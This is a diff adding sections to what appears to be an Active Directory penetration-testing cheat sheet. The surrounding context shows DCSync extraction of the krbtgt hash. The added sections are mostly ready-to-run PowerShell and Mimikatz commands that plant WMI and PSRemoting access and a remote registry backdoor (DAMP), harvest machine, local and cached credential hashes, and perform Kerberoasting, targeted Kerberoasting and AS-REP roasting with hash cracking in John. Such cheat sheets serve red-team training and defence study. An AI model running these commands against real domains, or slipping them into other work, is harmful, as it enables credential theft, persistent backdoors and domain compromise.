@@ -498,3 +498,97 @@ This can also be injected into lsass (unstable with Server 2016
 `Set-ADACL -SamAccountName <username> -DistinguishedName '<domainDN>' -GUIDRight DCSync`
  - Extract hashes or krbtgt (or any other user) using the DCSync rights and Mimikatz
 `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'`
+
+### Security Descriptors
+Using the RACE toolkit (https://github.com/samratashok/RACE)
+`. .\Set-RemoteWMI.ps1`
+ - Grant a user access to WMI on the local computer (requires admin privileges)
+`Set-RemoteWMI -SamAccountName <username>`
+ - Grant a standard user WMI privileges to access a remote computer (requires admin on the remote server to set the privileges)
+`Set-RemoteWMI -UserName <username> -ComputerName <servername> -namespace 'root\cimv2'`
+ - Allow access to WMI on remote machine with explicit credentials
+`Set-RemoteWMI -SamAccountName <username> -ComputerName <servername> -Credential <Administrator> -namespace 'root\cimv2'`
+ - Now view information of the server using WMI as the standard user that was granted access
+`gwmi -class win32_operatingsystem -ComputerName <servername>`
+ - You can also start a process on the remote server using WMI
+`Invoke-WMIMethod -Class win32_process -Name Create -ArgumentList calc.exe -ComputerName <servername>`
+ - Remove permissions on remote computer
+`Set-RemoteWMI -SamAccountName <username> -ComputerName <servername> -namespace 'root\cimv2' -Remove`
+  - Grant user access to PSRemoting on local machine
+`. .\Set-RemotePSRemoting.ps1`
+*Can show an IO error when run, but this does not mean it was not successful*
+`Set-RemotePSRemoting -SamAccountName <username>`
+ - Grant user access to PSRemoting on remote machine
+`Set-RemotePSRemoting -Username <username> -ComputerName <servername>`
+ - Now you can run PowerShell commands on the remote computer
+`Invoke-Command -ScriptBlock{whoami} -ComputerName <servername>`
+ - Remove the permissions on a remote machine
+`Set-RemotePSRemoting -SamAccountName <username> -ComputerName <servername> -Remove`
+
+To abuse the remote permissions and retrieve hashes you can use the DAMP toolkit (part of RACE toolkit)
+`. .\DAMP-master\Add-RemoteRegBackdoor.ps1`
+ - Add the required registry keys to gain access to the hashes
+`Add-RemoteRegbackdoor -ComputerName <servername> -Trustee <username>`
+ - As the "Trustee" (low priv user) retrieve the machine account hash in order to use this for a Silver Ticket
+Performing this on the remote machine requires the remote registry to be enabled (default on servers)
+`. .\DAMP-master\RemoteHashRetrieval.ps1`
+`Get-RemoteMachineAccountHash -ComputerName <servername>`
+You can work around this if it is disabled using PSRemoting
+```
+$sess = New-PSSession <servername>
+Invoke-Command -FilePath c:\tool\RACE.ps1 -Session $sess
+Enter-PSSession $sess
+Get-RemoteMachineAccountHash
+```
+ - Retrieve local account hash
+`Get-RemoteLocalAccountHash -ComputerName <servername>`
+ - Retrieve domain cached credentials
+`Get-RemoteCachedCredential -ComputerName <servername>`
+
+## Privilege Escalation
+### Kerberoasting
+#### PowerView
+ - Find user accounts that are used as kerberos service accounts
+`Get-NetUser -SPN`
+ - Request a TGS for the service (crack these with John or Hashcat)
+`Request-SPNTicket`
+#### Active Directory Module
+ - Find user accounts that are used as kerberos service accounts
+`Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName`
+ - Request a TGS for the service
+`Add-Type -AssemblyNAme System.IdentityModel`
+`New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"`
+ - Save the ticket to disk
+`Invoke-Mimikatz -Command '"kerberos::list /export"'`
+ - Brute force using TGSRepCrack
+`python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\<ticketname.kirbi>`
+ - If you have permissions you can set an SPN with the AD module for targeted Kerberoasting
+`Set-ADUser -Identity <targetuser> -ServicePrincipalNames @{Add='whatever/whatever1'`
+#### Targeted Kerberoasting using PowerView Dev
+ `. .\PowerView_dev.ps1`
+ - Enumerate accounts where your user or Group has GenericWrite or GenericAll permissions
+`Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user/groupname>"}`
+ - Force set an SPN (just needs to be string\string no other validation is performed) e.g. fake/service
+`Set-DomainObject -Identity <targetuser> -Set @{serviceprincipalname='whatever/whateverX'}`
+ - Request a TGS for that SPN
+`Get-DomainUser -Identity <targetuser> | Get-DomainSPNTicket | select -ExpandProperty Hash`
+
+### AS-REPRoasting
+#### PowerView (DEV)
+`. .\PowerView_dev.ps1`
+ - Enumerate accounts with Kerberos Pre-Auth disabled
+`Get-DomainUser -PreauthNotRequired`
+ - Enumerate accounts where your user or Group has GenericWrite or GenericAll permissions
+`Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<user/groupname>"}`
+ - Force the DoesNotRequirePreAuth attribute
+`Set-DomainObject -Identity <targetusername> -XOR @{useraccountcontrol=4194304}`
+
+#### AD Module
+ - Enumerate accounts with Kerberos Pre-Auth disabled
+`Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`
+
+#### ASREPRoast Module & John The Ripper
+ - Get the AS-REP Hash
+`Get-ASREPHash -UserName <username>`
+ - Brute Force the hash
+`john <hashfile.txt> --wordlist=wordlist.txt`
